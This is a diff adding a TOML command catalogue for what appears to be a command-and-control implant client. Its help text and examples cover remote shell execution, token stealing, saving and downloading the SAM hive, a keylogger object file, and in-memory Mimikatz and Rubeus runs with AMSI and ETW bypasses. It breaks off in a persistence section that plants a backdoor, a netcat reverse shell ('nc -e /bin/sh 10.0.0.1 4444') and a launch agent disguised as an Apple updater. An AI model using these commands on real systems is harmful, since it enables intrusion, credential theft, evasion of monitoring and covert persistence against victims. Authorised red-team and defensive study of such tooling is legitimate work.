@@ -1,0 +1,2777 @@
+[commands]
+
+[commands.help]
+fileName = "help"
+name = "help"
+os_compatibility = "all"
+description = "Show general help or details for a specific command"
+syntax = """
+help                     # Show all commands with a short description
+help <command>           # Show detailed help for a specific command
+"""
+examples = [
+    "help",
+    "help upload",
+    "help socks"
+]
+help = """
+Client-side help viewer:
+- 'help' prints all available commands with a short description.
+- 'help <command>' prints detailed help using the fields in commands.toml:
+  name, description, syntax, examples, and help.
+This never goes to the server and is rendered instantly in the terminal.
+"""
+
+[commands.shell]
+fileName = "shell"
+name = "shell"
+os_compatibility = "all"
+description = "Execute a shell command on the target system (token-aware on Windows)"
+syntax = """
+shell <command> [arguments...]
+shell --timeout <seconds> <command> [arguments...]
+"""
+examples = [
+    "shell whoami",
+    "shell netstat -an",
+    "shell ps aux",
+    "shell ipconfig /all",
+    "shell ls -la /tmp",
+    "shell --timeout 5 ping google.com",
+    "shell --timeout 60 ./long-running-script.sh"
+]
+help = """
+Executes commands in the target system's shell:
+- Windows: Uses cmd.exe (token-aware - see below)
+- Linux/macOS: Uses user's default shell ($SHELL) with fallback to bash, zsh, then sh
+- Command and all arguments are passed directly to the shell
+- Output is returned when the command completes
+- Default timeout is 30 seconds
+
+TOKEN-AWARE EXECUTION (Windows):
+When a token is active (via steal-token or make-token), shell commands automatically:
+- Execute with the impersonated user's privileges
+- Use CreateProcessAsUser API for proper token inheritance
+- Show the active token name in command output
+- Maintain token context across command execution
+
+Example workflow:
+  steal-token 1752 system     # Steal SYSTEM token
+  shell whoami                # Returns "NT AUTHORITY\\SYSTEM"
+  shell reg save HKLM\\SAM sam  # Works with SYSTEM privileges
+  rev2self                     # Revert to original token
+  shell whoami                # Returns original user
+
+Options:
+  --timeout <seconds>  Set custom timeout for command execution (default: 30)
+  
+Examples:
+  shell whoami                    # Run whoami with default 30s timeout
+  shell --timeout 5 ping 8.8.8.8  # Run ping with 5 second timeout
+  shell --timeout 60 ./script.sh  # Run script with 60 second timeout
+  
+Shell Detection (Unix/Linux/macOS):
+  1. Uses $SHELL environment variable if set and valid
+  2. Falls back to /bin/bash if available
+  3. Falls back to /bin/zsh if available (macOS default)
+  4. Falls back to /bin/sh as last resort (POSIX standard)
+  
+Security Notes:
+- Commands run with agent's privileges (or impersonated token on Windows)
+- No input sanitization is performed
+- Use with caution on production systems
+- Token context is shown in output header on Windows
+"""
+
+[commands.sudo_session]
+fileName = "sudo_session"
+name = "sudo-session"
+os_compatibility = ["linux", "darwin"]
+description = "Manage persistent sudo sessions with optional state tracking for elevated command execution"
+syntax = """
+sudo-session start <password> [username]  # Start session as root or specified user
+sudo-session exec <command>               # Execute command in active session
+sudo-session exec-stateful <command>      # Execute with forced state persistence
+sudo-session enable-stateful              # Enable state tracking (cd, env vars persist)
+sudo-session disable-stateful             # Disable state tracking (default)
+sudo-session status                       # Check session status and mode
+sudo-session stop                         # Terminate active session
+"""
+examples = [
+    "sudo-session start mypassword",           # Switch to root
+    "sudo-session start mypassword postgres",  # Switch to postgres user
+    "sudo-session exec whoami",                # Stateless execution (default)
+    "sudo-session enable-stateful",            # Enable state persistence
+    "sudo-session exec cd /tmp",               # Change directory (persists in stateful)
+    "sudo-session exec pwd",                   # Shows /tmp if stateful enabled
+    "sudo-session exec export FOO=bar",        # Set environment variable
+    "sudo-session exec echo $FOO",             # Shows 'bar' if stateful enabled
+    "sudo-session exec-stateful ls",           # One-off stateful execution
+    "sudo-session disable-stateful",           # Return to stateless mode
+    "sudo-session status",                     # Shows mode and current directory
+    "sudo-session stop"                        # Terminate session
+]
+help = """
+Manages an elevated shell session with optional state persistence:
+
+EXECUTION MODES:
+  Stateless (Default): Each command runs independently, no state persists
+  Stateful (Optional): Tracks directory changes and environment variables
+
+SUBCOMMANDS:
+  start <password> [username]  - Start sudo session (default: root)
+  exec <command>               - Execute command (uses current mode)
+  exec-stateful <command>      - Force stateful execution for one command
+  enable-stateful              - Switch to stateful mode
+  disable-stateful             - Switch to stateless mode (default)
+  status                       - Show session info, mode, and tracked state
+  stop                         - Terminate the session
+
+HOW STATEFUL MODE WORKS:
+  - Tracks 'cd' commands and maintains working directory
+  - Tracks 'export' commands and maintains environment variables
+  - Applies tracked state to each command execution
+  - Each command still runs independently (reliable)
+  - State is simulated, not using a persistent shell
+
+USER SUPPORT:
+  - Default: 'sudo-session start <password>' switches to root
+  - Specific user: 'sudo-session start <password> <username>'
+  - Examples: postgres, www-data, oracle, nginx, etc.
+
+USAGE FLOWS:
+
+  Stateless (Reliable, Default):
+    sudo-session start mypass
+    sudo-session exec cd /tmp        # Doesn't affect next command
+    sudo-session exec pwd            # Still in original directory
+    
+  Stateful (State Tracking):
+    sudo-session start mypass
+    sudo-session enable-stateful
+    sudo-session exec cd /tmp        # Changes tracked directory
+    sudo-session exec pwd            # Shows /tmp
+    sudo-session exec export FOO=bar # Sets tracked env var
+    sudo-session exec echo $FOO      # Shows 'bar'
+
+  # Check current mode and state
+  sudo-session status
+  # Output: Active session for user 'root' (PID: 12345, Mode: stateful (simulated, pwd: /etc/nginx), Uptime: 2m)
+  
+  # Environment variables (stateful only)
+  sudo-session enable-stateful
+  sudo-session exec export DB_HOST=localhost
+  sudo-session exec export DB_PORT=5432
+  sudo-session exec 'echo Database: $DB_HOST:$DB_PORT'  # Shows: Database: localhost:5432
+  
+  # Clean up
+  sudo-session stop
+
+SECURITY NOTES:
+  - Password stored in memory during session
+  - Session remains active until stopped or agent disconnects
+  - Always use 'sudo-session stop' when done
+  - Each agent has independent sessions
+  
+TECHNICAL DETAILS:
+  - Stateless: Each 'exec' runs 'sudo -S sh -c <command>' independently
+  - Stateful: Tracks state and runs 'cd <dir> && export VAR=val && <command>'
+  - Falls back to stateless if any issues occur
+  - Status shows current mode and tracked directory
+"""
+
+[commands.upload]
+fileName = "upload"
+name = "upload"
+os_compatibility = "all"
+description = "Upload a file to the target system"
+syntax = """
+upload                     # Opens file dialog
+upload <local_path>        # Upload to CWD with original filename
+upload <local_path> <new_name>        # Upload to CWD with new filename
+upload <local_path> <remote_path>     # Upload to specific remote path
+"""
+examples = [
+    "upload                             # Opens file selection dialog",
+    "upload /tmp/payload.exe            # Uploads as payload.exe in current directory",
+    "upload /tmp/payload.exe new.exe    # Uploads as new.exe in current directory",
+    "upload /tmp/payload.exe C:\\Windows\\payload.exe   # Uploads to full remote path",
+    "upload ./script.sh /tmp/script.sh  # Uploads to full remote path"
+]
+help = """
+Transfers a file to the target system:
+- No arguments: Opens file selection dialog
+- One argument: Uploads to current working directory with original filename
+- Two arguments:
+  * If second starts with / or \\: Uses as full remote path
+  * Otherwise: Uses as new filename in current directory
+- Local path must exist
+- Remote path must be writable
+- Progress shown during transfer
+"""
+
+[commands.download]
+fileName = "download"
+name = "download"
+os_compatibility = "all"
+description = "Download a file from the target system"
+syntax = "download <filename> "
+examples = [
+    "download C:\\Windows\\System32\\config\\SAM ./sam.bak",
+    "download /etc/passwd ./passwd.txt"
+]
+help = """
+Retrieves a file from target system:
+- Remote file must exist and be readable
+"""
+
+[commands.pwd]
+fileName = "pwd"
+name = "pwd"
+os_compatibility = "all"
+description = "Print working directory"
+syntax = "pwd"
+examples = ["pwd"]
+help = "Shows current working directory on target system"
+
+[commands.cd]
+fileName = "cd"
+name = "cd"
+os_compatibility = "all"
+description = "Change working directory"
+syntax = "cd <path>"
+examples = [
+    "cd C:\\Users",
+    "cd /home/user",
+    "cd .."
+]
+help = "Changes current working directory on target system"
+
+[commands.ls]
+name = "ls"
+fileName = "ls"
+os_compatibility = "all"
+description = "List directory contents with optional filtering"
+syntax = "ls [-a] [-h] [-R] [--max-depth=N] [--count] [-f pattern]... [-i pattern]... [--exclude pattern]... [path]"
+examples = [
+    "ls",
+    "ls -a",
+    "ls /etc",
+    "ls -h",
+    "ls -R /home/user",
+    "ls -ahR ~/Documents",
+    "ls -R --max-depth=2",
+    "ls -R --max-depth=1 /var",
+    "ls -ahR --max-depth=3",
+    "ls --count",
+    "ls -R --count",
+    "ls -a --count",
+    "ls -R --max-depth=2 --count",
+    "ls -f .log --count",
+    "ls -f .go -f .md",
+    "ls -f .js -f .ts --exclude node_modules",
+    "ls -R --exclude .git --exclude target",
+    "ls -a -f .config",
+    "ls -i CONFIG /etc",
+    "ls -hR -f .go /usr/src",
+    "ls -R --max-depth=2 -f .log",
+    "ls --filter test",
+    "ls --filter-ignore readme"
+]
+help = """
+Lists contents of specified directory with optional filtering:
+- No path shows current directory
+- Supported flags:
+  -a : Show all files including hidden files (files starting with '.')
+  -h : Human-readable file sizes (KB, MB, GB instead of bytes)
+  -R : Recursive listing (includes subdirectories)
+  --max-depth=N : Limit recursion depth (0=current dir only, works with -R)
+  --count : Show only counts of files/directories instead of listing them
+  -f <pattern> or --filter <pattern> : Filter files by pattern (case-sensitive)
+      Can be used multiple times for OR matching
+  -i <pattern> or --filter-ignore <pattern> : Filter files by pattern (case-insensitive)
+      Can be used multiple times for OR matching
+  --exclude <pattern> : Exclude files/directories matching pattern
+      Can be used multiple times
+      Excluded directories are not traversed in recursive mode
+- Flags can be combined (e.g., -ahR --count -f pattern)
+- Filters use substring matching (shows files containing the pattern)
+- Multiple -f or -i flags show files matching ANY pattern (OR logic)
+- Exclusions are applied after inclusion filters
+- By default, hidden files (starting with '.') are not shown unless -a is used
+- When using -R without -a, hidden directories are also skipped
+- --max-depth=0 shows only the current directory (no recursion)
+- --max-depth=1 shows current directory and immediate subdirectories
+- Without --max-depth, -R recurses unlimited depth
+- --count shows statistics instead of file listings
+- With filters, --count shows "Matching items" count
+
+Examples of multiple filters and exclusions:
+  ls -f .go -f .md              # Find all Go OR Markdown files
+  ls -i test -i spec             # Find files containing 'test' OR 'spec' (case-insensitive)
+  ls -R --exclude node_modules   # Recursive list, skip node_modules directories
+  ls -f .js --exclude .min.js    # Find .js files but not minified ones
+  ls -R -f .log --exclude archive --exclude backup   # Find logs, skip archive and backup dirs
+"""
+
+[commands.socks]
+name = "socks"
+fileName = "socks"
+os_compatibility = "all"
+description = "Start/stop SOCKS proxy server"
+syntax = "socks <start|stop> <socks_port> <path> <wss_port>"
+examples = [
+    "socks start 1080 https://domain.com/some/path 443",
+    "socks stop 1080"
+]
+help = """
+Starts or stops a SOCKS proxy server:
+- Requires a valid WebSocket URL
+- Start requires ports for SOCKS and WSS
+- Stop requires only the SOCKS port
+"""
+
+[commands.clear]
+name = "clear"
+fileName = "clear"
+os_compatibility = "all"
+description = "Clear pending commands for the agent"
+syntax = "clear"
+examples = ["clear"]
+help = """
+Clears all pending commands for the agent except for file transfers:
+- Removes non-file-transfer commands from queue
+- Keeps 'upload' and 'download' commands intact
+- Useful for canceling queued commands
+"""
+
+[commands.jobs]
+name = "jobs"
+fileName = "jobs"
+os_compatibility = "all"
+description = "List all active file transfer jobs"
+syntax = "jobs"
+examples = ["jobs"]
+help = """
+Shows all active file transfers:
+- Lists ongoing uploads and downloads
+- Shows progress for each transfer
+- Displays job IDs for tracking
+"""
+
+[commands.jobkill]
+name = "jobkill"
+fileName = "jobkill"
+os_compatibility = "all"
+description = "Kill an active file transfer job"
+syntax = "jobkill <job_id>"
+examples = [
+    "jobkill 1",
+    "jobkill 3"
+]
+help = """
+Terminates an active file transfer job:
+- Requires a valid job ID from 'jobs' command
+- Stops both uploads and downloads
+- Cleans up any partial transfers
+- Job ID must be a number
+"""
+
+[commands.exit]
+name = "exit"
+fileName = "exit"
+os_compatibility = "all"
+description = "Gracefully exit/kill the agent"
+syntax = "exit"
+examples = ["exit"]
+help = """
+Gracefully stops the agent:
+- Cleans up active jobs
+- Removes temporary files
+- Stops running services
+- Exits process cleanly
+"""
+
+[commands.sleep]
+name = "sleep"
+fileName = "sleep"
+os_compatibility = "all"
+description = "Change agent check-in interval and jitter"
+syntax = "sleep <duration> [jitter_percent]"
+examples = [
+    "sleep 30",       # 30 seconds
+    "sleep 1m 15",    # 1 minute with 15% jitter
+    "sleep 1m30s 5",  # 1 minute 30 seconds with 5% jitter
+    "sleep 2h 10",    # 2 hours with 10% jitter
+    "sleep 1h5m 20"   # 1 hour 5 minutes with 20% jitter
+]
+help = """
+Changes the agent polling/sleep interval and jitter:
+- Duration supports s(seconds), m(minutes), h(hours)
+- Can combine units: 1m30s, 1h5m, 2h30m
+- Optional jitter percentage (0-100)
+- Examples: sleep 30s 5 (30 sec, 5% jitter), sleep 1m30s 15 (90 sec, 15% jitter)
+- Takes effect on next check-in
+"""
+
+[commands.rekey]
+name = "rekey"
+fileName = "rekey"
+os_compatibility = "all"
+description = "Re-initialize client encryption and get new client ID"
+syntax = "rekey"
+examples = ["rekey"]
+help = """
+Forces the client to perform a new initialization handshake:
+- Gets new client ID
+- Resets encryption state
+- Re-establishes secure channel
+Use when encryption gets out of sync.
+"""
+
+# BOF Commands - Windows Only
+
+[commands.bof]
+fileName = "bof"
+name = "bof"
+os_compatibility = "windows"
+description = "Execute a Beacon Object File (BOF) with arguments"
+syntax = """
+bof <path_to_bof.o> [arguments...]
+bof <path_to_bof.o>                       # Execute BOF without arguments
+bof <path_to_bof.o> arg1 arg2             # Execute with string arguments
+bof <path_to_bof.o> -i:123 -s:hello        # Execute with typed arguments
+"""
+examples = [
+    "bof /path/to/whoami.x64.o",
+    "bof /path/to/dir.x64.o C:\\Windows\\System32",
+    "bof /path/to/netuser.x64.o -w:Administrator -w:DOMAIN",
+    "bof /path/to/portscan.x64.o -s:192.168.1.0/24 -i:445"
+]
+help = """
+Executes a Beacon Object File (BOF) in the agent's memory:
+- First argument must be path to a .o (COFF) file
+- Supports x64 and x86 BOF files
+- Arguments can be passed in different formats:
+  * Plain strings: treated as string arguments
+  * -s:value : String argument
+  * -w:value : Wide string (Unicode) argument
+  * -i:value : Integer argument (32-bit)
+  * -I:value : Integer argument (64-bit)
+  * -z:value : Binary data (base64 encoded)
+  * -Z:value : Binary data with size prefix
+- BOFs run in the agent's process memory
+- Output is captured and returned
+- Crashes in BOFs are isolated (with async mode)
+"""
+
+[commands.bof-async]
+fileName = "bof-async"
+name = "bof-async"
+os_compatibility = "windows"
+description = "Execute a BOF asynchronously in a separate thread"
+syntax = """
+bof-async <path_to_bof.o> [arguments...]
+bof-async <path_to_bof.o>                 # Execute async without arguments
+bof-async <path_to_bof.o> arg1 arg2       # Execute async with arguments
+"""
+examples = [
+    "bof-async /path/to/long_running.x64.o",
+    "bof-async /path/to/scanner.x64.o 192.168.1.0/24 1-1000",
+    "bof-async /path/to/keylogger.x64.o 60"
+]
+help = """
+Executes a BOF asynchronously in a separate thread:
+- Same argument format as regular 'bof' command
+- BOF runs in background without blocking agent
+- Each async BOF gets a unique job ID
+- Use 'bof-jobs' to list running BOFs
+- Use 'bof-output <job_id>' to get output
+- Use 'bof-kill <job_id>' to terminate
+- Crashes won't affect the main agent process
+"""
+
+[commands.bof-jobs]
+fileName = "bof-jobs"
+name = "bof-jobs"
+os_compatibility = "windows"
+description = "List all running asynchronous BOF jobs"
+syntax = "bof-jobs"
+examples = ["bof-jobs"]
+help = """
+Shows all currently running asynchronous BOF jobs:
+- Lists job ID, BOF name, status, and start time
+- Shows memory usage for each job
+- Indicates if output is available
+"""
+
+[commands.bof-output]
+fileName = "bof-output"
+name = "bof-output"
+os_compatibility = "windows"
+description = "Retrieve output from an async BOF job"
+syntax = "bof-output <job_id>"
+examples = [
+    "bof-output 1",
+    "bof-output 5"
+]
+help = """
+Retrieves accumulated output from an async BOF job:
+- Requires valid job ID from 'bof-jobs'
+- Returns all output since last retrieval
+- Does not terminate the job
+"""
+
+[commands.bof-kill]
+fileName = "bof-kill"
+name = "bof-kill"
+os_compatibility = "windows"
+description = "Terminate an async BOF job"
+syntax = "bof-kill <job_id>"
+examples = [
+    "bof-kill 1",
+    "bof-kill 3"
+]
+help = """
+Forcefully terminates an async BOF job:
+- Requires valid job ID from 'bof-jobs'
+- Cleans up allocated memory
+- Returns any remaining output
+- Job cannot be restarted
+"""
+
+# Inline Assembly Commands - Windows Only
+
+[commands.inline_assembly]
+fileName = "inline-assembly"
+name = "inline-assembly"
+os_compatibility = "windows"
+description = "Execute a .NET assembly in memory without creating new processes"
+syntax = """
+inline-assembly <path_to_assembly> [arguments...]
+inline-assembly <path_to_assembly>                    # Execute without arguments
+inline-assembly <path_to_assembly> arg1 arg2          # Execute with arguments
+inline-assembly <path_to_assembly> --amsi             # Enable AMSI bypass
+inline-assembly <path_to_assembly> --etw              # Enable ETW bypass
+inline-assembly <path_to_assembly> --amsi --etw       # Enable both bypasses
+inline-assembly <path_to_assembly> --revert-etw       # Revert ETW after execution
+inline-assembly <path_to_assembly> --app-domain NAME  # Specify AppDomain name
+"""
+examples = [
+    "inline-assembly /path/to/Seatbelt.exe -group=all",
+    "inline-assembly /path/to/SharpUp.exe",
+    "inline-assembly /path/to/Rubeus.exe --amsi kerberoast",
+    "inline-assembly /path/to/SharpHound.exe --etw -c all",
+    "inline-assembly /path/to/Mimikatz.exe --amsi --etw coffee",
+    "inline-assembly /path/to/Watson.exe --app-domain MyDomain",
+    "inline-assembly /path/to/Custom.exe --amsi --revert-etw"
+]
+help = """
+Executes .NET assemblies in memory without touching disk:
+
+OPTIONS:
+  --amsi              Enable AMSI bypass before execution
+  --etw               Enable ETW bypass before execution  
+  --revert-etw        Revert ETW patches after execution
+  --app-domain <name> Specify AppDomain name (default: InlineAssembly)
+
+EXECUTION METHODS (Windows):
+1. C# wrapper compilation for output capture
+2. PowerShell fallback if csc.exe unavailable
+3. Direct CLR hosting via ICLRRuntimeHost
+4. Windows API pipe redirection for stdout/stderr
+
+EXAMPLES:
+  # Safe execution (no bypasses)
+  inline-assembly /path/to/Seatbelt.exe -group=all
+  
+  # With AMSI bypass for tools that need it
+  inline-assembly /path/to/Rubeus.exe --amsi kerberoast
+  
+  # With ETW bypass for monitoring evasion
+  inline-assembly /path/to/SharpHound.exe --etw -c all
+  
+  # With both bypasses for high-risk tools
+  inline-assembly /path/to/Mimikatz.exe --amsi --etw coffee
+  
+  # Custom AppDomain
+  inline-assembly /path/to/Tool.exe --app-domain CustomDomain
+"""
+
+[commands.inline_assembly_async]
+fileName = "inline-assembly-async"
+name = "inline-assembly-async"
+os_compatibility = "windows"
+description = "Execute a .NET assembly asynchronously in a separate thread"
+syntax = """
+inline-assembly-async <path_to_assembly> [arguments...]
+inline-assembly-async <path_to_assembly>              # Execute async without arguments
+inline-assembly-async <path_to_assembly> arg1 arg2    # Execute async with arguments
+inline-assembly-async <path_to_assembly> --amsi       # Async with AMSI bypass
+inline-assembly-async <path_to_assembly> --etw        # Async with ETW bypass
+"""
+examples = [
+    "inline-assembly-async /path/to/SharpHound.exe -c all",
+    "inline-assembly-async /path/to/LongRunning.exe",
+    "inline-assembly-async /path/to/Scanner.exe --amsi 192.168.1.0/24",
+    "inline-assembly-async /path/to/Monitor.exe --etw --app-domain Monitor"
+]
+help = """
+Executes .NET assemblies asynchronously in background:
+
+FEATURES:
+- Same capabilities as inline-assembly but non-blocking
+- Runs in separate thread without blocking agent
+- Each async execution gets a unique job ID
+- Output buffered for later retrieval
+
+OPTIONS:
+  Same as inline-assembly:
+  --amsi              Enable AMSI bypass
+  --etw               Enable ETW bypass
+  --revert-etw        Revert ETW patches
+  --app-domain <name> Specify AppDomain name
+
+JOB MANAGEMENT:
+- Use 'inline-assembly-jobs' to list running assemblies
+- Use 'inline-assembly-output <job_id>' to get output
+- Use 'inline-assembly-kill <job_id>' to terminate
+
+EXAMPLES:
+  # Long-running collection tool
+  inline-assembly-async /path/to/SharpHound.exe -c all
+  
+  # Background scanner with AMSI bypass
+  inline-assembly-async /path/to/Scanner.exe --amsi 10.0.0.0/8
+  
+  # Monitor with ETW bypass
+  inline-assembly-async /path/to/EventMon.exe --etw
+"""
+
+[commands.execute_assembly]
+fileName = "execute-assembly"
+name = "execute-assembly"
+os_compatibility = "windows"
+description = "Alias for inline-assembly command"
+syntax = """
+execute-assembly <path_to_assembly> [arguments...]
+"""
+examples = [
+    "execute-assembly /path/to/Rubeus.exe kerberoast",
+    "execute-assembly /path/to/Seatbelt.exe -group=all"
+]
+help = """
+Alias for inline-assembly command. See 'help inline-assembly' for full documentation.
+
+This alias is provided for compatibility with other C2 frameworks.
+All functionality is identical to inline-assembly.
+"""
+
+[commands.inline_execute]
+fileName = "inline-execute"
+name = "inline-execute"
+os_compatibility = "windows"
+description = "Alias for inline-assembly command"
+syntax = """
+inline-execute <path_to_assembly> [arguments...]
+"""
+examples = [
+    "inline-execute /path/to/SharpUp.exe",
+    "inline-execute /path/to/Watson.exe"
+]
+help = """
+Alias for inline-assembly command. See 'help inline-assembly' for full documentation.
+
+This alias is provided as a shorter alternative to inline-assembly.
+All functionality is identical to inline-assembly.
+"""
+
+[commands.inline_assembly_jobs]
+fileName = "inline-assembly-jobs"
+name = "inline-assembly-jobs"
+os_compatibility = "windows"
+description = "List all running asynchronous assembly jobs"
+syntax = "inline-assembly-jobs"
+examples = ["inline-assembly-jobs"]
+help = """
+Shows all currently running asynchronous .NET assembly jobs:
+
+USAGE:
+  inline-assembly-jobs              # List all jobs
+
+NOTES:
+- Jobs persist until output is retrieved or killed
+- Completed jobs show 'Completed' status
+- Failed jobs show error information
+"""
+
+[commands.inline_assembly_output]
+fileName = "inline-assembly-output"
+name = "inline-assembly-output"
+os_compatibility = "windows"
+description = "Retrieve output from an async assembly job"
+syntax = "inline-assembly-output <job_id>"
+examples = [
+    "inline-assembly-output 1",
+    "inline-assembly-output 3"
+]
+help = """
+Retrieves accumulated output from an async assembly job:
+
+USAGE:
+  inline-assembly-output <job_id>   # Get output from specific job
+  
+EXAMPLES:
+  inline-assembly-output 1          # Get output from job 1
+  inline-assembly-output 5          # Get output from job 5
+"""
+
+[commands.inline_assembly_kill]
+fileName = "inline-assembly-kill"
+name = "inline-assembly-kill"
+os_compatibility = "windows"
+description = "Terminate an async assembly job"
+syntax = "inline-assembly-kill <job_id>"
+examples = [
+    "inline-assembly-kill 1",
+    "inline-assembly-kill 3"
+]
+help = """
+Forcefully terminates an async assembly job:
+
+USAGE:
+  inline-assembly-kill <job_id>     # Kill specific job
+  
+EXAMPLES:
+  inline-assembly-kill 1            # Terminate job 1
+  inline-assembly-kill 5            # Terminate job 5
+"""
+
+[commands.inline_assembly_jobs_clean]
+fileName = "inline-assembly-jobs-clean"
+name = "inline-assembly-jobs-clean"
+os_compatibility = "windows"
+description = "Clean up completed, killed, or failed assembly jobs from memory"
+syntax = """
+inline-assembly-jobs-clean                # Clean all non-running jobs
+inline-assembly-jobs-clean <job_id>       # Clean specific job (if not running)
+"""
+examples = [
+    "inline-assembly-jobs-clean",
+    "inline-assembly-jobs-clean inline_asm_1755706455548",
+    "inline-assembly-jobs-clean 1755706455548"
+]
+help = """
+Removes completed, killed, failed, or timed-out assembly jobs from memory:
+
+FEATURES:
+- Cleans up job tracking to free memory
+- Prevents job list from growing too large
+- Cannot clean running jobs (must kill first)
+- Supports partial job ID matching
+
+USAGE:
+  inline-assembly-jobs-clean              # Remove ALL non-running jobs
+  inline-assembly-jobs-clean <job_id>     # Remove specific job if not running
+  
+EXAMPLES:
+  # Clean all completed/killed/failed jobs
+  inline-assembly-jobs-clean
+  
+  # Clean specific job by ID
+  inline-assembly-jobs-clean inline_asm_1755706455548
+  
+  # Clean using partial ID
+  inline-assembly-jobs-clean 1755706455548
+"""
+
+[commands.inline_assembly_jobs_stats]
+fileName = "inline-assembly-jobs-stats"
+name = "inline-assembly-jobs-stats"
+os_compatibility = "windows"
+description = "Display statistics about assembly jobs"
+syntax = "inline-assembly-jobs-stats"
+examples = ["inline-assembly-jobs-stats"]
+help = """
+Shows statistical summary of all assembly jobs in memory:
+
+DISPLAYED INFORMATION:
+- Total number of jobs
+- Count of running jobs
+- Count of completed jobs
+- Count of failed jobs
+- Count of killed jobs
+- Count of timeout jobs
+
+USAGE:
+  inline-assembly-jobs-stats              # Show job statistics
+"""
+
+[commands.cna_load]
+fileName = "cna-load"
+name = "cna-load"
+os_compatibility = "all"
+description = "Load a Cobalt Strike Aggressor (CNA) script"
+syntax = """
+cna-load <path_to_cna_file>
+"""
+examples = [
+    "cna-load /path/to/bof.cna",
+    "cna-load ~/tools/trustedsec-bofs/bof.cna"
+]
+help = """
+Loads a Cobalt Strike Aggressor (CNA) script file and registers its commands.
+This allows you to use BOF collections that come with CNA scripts.
+
+The interpreter will:
+- Parse beacon_command_register declarations
+- Extract alias definitions
+- Map commands to their BOF implementations
+- Auto-locate BOF files relative to the CNA script
+
+Supported CNA features:
+- beacon_command_register
+- beacon_inline_execute
+- alias definitions
+- bof_pack argument packing
+- readbof BOF file loading
+- Basic conditionals (iff)
+- Logging (btask, blog, berror)
+
+Note: This is a subset implementation of the CNA language focused on BOF integration.
+"""
+
+[commands.cna_list]
+fileName = "cna-list"
+name = "cna-list"
+os_compatibility = "all"
+description = "List loaded CNA scripts and their commands"
+syntax = "cna-list"
+examples = ["cna-list"]
+help = "Shows all currently loaded CNA scripts and the commands they provide"
+
+# Add these entries to your client/src/gui/widgets/commands.toml file
+
+[commands.env]
+fileName = "env"
+name = "env"
+os_compatibility = "all"
+description = "Display, set, or remove environment variables"
+syntax = """
+env                        # Display all environment variables
+env <VAR_NAME>            # Display specific variable
+env <VAR_NAME>=<VALUE>    # Set environment variable
+env -u <VAR_NAME>         # Unset/remove environment variable
+env --unset <VAR_NAME>    # Alternative unset syntax
+"""
+examples = [
+    "env                    # Show all environment variables",
+    "env PATH               # Show PATH variable",
+    "env CUSTOM_VAR=test    # Set CUSTOM_VAR to 'test'",
+    "env -u CUSTOM_VAR      # Remove CUSTOM_VAR",
+    "env --unset DEBUG      # Remove DEBUG variable"
+]
+help = """
+Manages environment variables in the current session:
+- No arguments: displays all environment variables
+- Single argument (VAR_NAME): displays specific variable value
+- VAR_NAME=VALUE format: sets environment variable for the session
+- -u or --unset: removes an environment variable
+- Changes are session-specific and don't persist after agent restart
+"""
+
+[commands.cat]
+fileName = "cat"
+name = "cat"
+os_compatibility = "all"
+description = "Display file contents with optional filtering"
+syntax = """
+cat <file>                     # Display entire file
+cat <file> -f <pattern>        # Filter lines containing pattern (case-sensitive)
+cat <file> --filter <pattern>  # Alternative filter syntax
+cat <file> -i <pattern>        # Case-insensitive filter
+"""
+examples = [
+    "cat /etc/passwd",
+    "cat config.txt -f error       # Show lines containing 'error' (case-sensitive)",
+    "cat log.txt -i warning        # Case-insensitive search for 'warning'",
+    "cat data.csv --filter ,admin, # Find lines with ',admin,'",
+    "cat app.log -f ERROR:*      # Lines starting with 'ERROR:'",
+    "cat test.txt -i *warn*      # Lines containing 'warn' anywhere (case-insensitive)",
+    "cat file.txt -f *success    # Lines ending with 'success'",
+    "cat data.log -f user?id     # Match 'userid' or 'user-id' etc (? = any single char)",
+    "cat error.log -f *[ERROR]*  # Lines containing '[ERROR]' anywhere"
+]
+help = """
+Displays file contents with optional filtering:
+- Reads and outputs entire file by default
+- Use -f or --filter for case-sensitive pattern matching
+- Use -i for case-insensitive pattern matching
+- Supports wildcards:
+  * = matches any sequence of characters
+  ? = matches exactly one character
+  *pattern* = matches pattern anywhere in line
+- Pattern matching searches each line
+- File must be readable by the agent process
+- Output includes line numbers when filtering (format: linenum:content)
+"""
+
+[commands.hash]
+name = "hash"
+fileName = "hash"
+os_compatibility = "all"
+description = "Calculate MD5 or SHA256 hash of files"
+syntax = "hash <file_path> [algorithm]"
+examples = [
+    "hash /etc/passwd",                    # SHA256 by default
+    "hash /etc/passwd sha256",              # Explicit SHA256
+    "hash /etc/passwd md5",                 # MD5 hash
+    "hash /etc/passwd all",                 # Both MD5 and SHA256
+    "hash C:\\Windows\\System32\\notepad.exe",      # Windows path
+    "hash ./document.pdf all",              # Relative path, all hashes
+    "hash config.json md5"                  # MD5 of local file
+]
+help = """
+Calculate cryptographic hashes of files on the target system.
+
+Algorithms:
+  - md5: Calculate MD5 hash (128-bit)
+  - sha256: Calculate SHA256 hash (256-bit) [DEFAULT]
+  - all: Calculate both MD5 and SHA256
+
+Features:
+  - Supports absolute and relative paths
+  - Works on all operating systems
+  - Efficient streaming for large files
+  - Clear error reporting
+"""
+
+[commands.hashdir]
+name = "hashdir"
+fileName = "hashdir"
+os_compatibility = "all"
+description = "Recursively hash files in a directory"
+syntax = "hashdir <directory_path> [algorithm] [pattern]"
+examples = [
+    "hashdir /var/log",                     # Hash all files in /var/log
+    "hashdir /bin md5",                     # MD5 all files in /bin
+    "hashdir C:\\Windows\\System32 sha256 *.exe",  # Hash only .exe files
+    "hashdir ./downloads all *.pdf",        # All hashes for PDF files
+    "hashdir /home/user sha256 *.conf"      # Hash config files
+]
+help = """
+Recursively calculate hashes for multiple files in a directory.
+
+Parameters:
+  - directory_path: Target directory to scan
+  - algorithm: Hash algorithm (md5/sha256) [DEFAULT: sha256]
+  - pattern: File pattern to match [DEFAULT: *]
+
+Features:
+  - Recursive directory traversal
+  - Pattern matching for selective hashing
+  - Batch processing with progress
+  - Error handling for inaccessible files
+
+Output includes:
+  - Hash value and relative file path
+  - Summary of files processed
+  - Error count for failed files
+"""
+
+[commands.persist]
+fileName = "persist"
+name = "persist"
+os_compatibility = ["darwin", "linux"]
+description = "Establish persistence through various macOS mechanisms"
+syntax = """
+persist rc --user <username> --command <cmd> [--files .zshrc,.bash_profile]
+persist launch --name <service> --command <cmd> [--user|--system] [--interval <seconds>]
+persist login --name <name> --path <app_path>
+persist periodic --command <cmd> --frequency <daily|weekly|monthly>
+"""
+examples = [
+    "persist rc --command '/tmp/backdoor.sh'",
+    "persist rc --user admin --command 'nc -e /bin/sh 10.0.0.1 4444'",
+    "persist rc --command './agent' --files .zshrc,.bash_profile,.profile",
+    "persist launch --name com.apple.updater --command '/tmp/agent' --interval 3600",
